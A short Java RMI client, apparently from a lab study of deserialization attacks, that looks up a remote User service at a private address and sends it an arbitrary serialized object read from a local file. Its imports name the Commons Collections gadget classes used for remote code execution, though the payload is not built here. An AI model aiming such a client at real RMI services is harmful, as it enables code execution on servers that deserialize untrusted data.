package RMI;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.FileInputStream;
import java.io.ObjectInputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.rmi.Naming;
import java.util.HashMap;
import java.util.Map;

public class UserClient2 {
    public static void main(String[] args) throws Exception{
        String url = "rmi://10.10.10.1:4396/User";
        User userClient = (User) Naming.lookup(url);

        System.out.println(userClient.name("sijidou"));
        userClient.say("world");
        userClient.dowork(getpayload());
    }
    public static Object getpayload() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("1.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        return objectInputStream.readObject();
    }
}

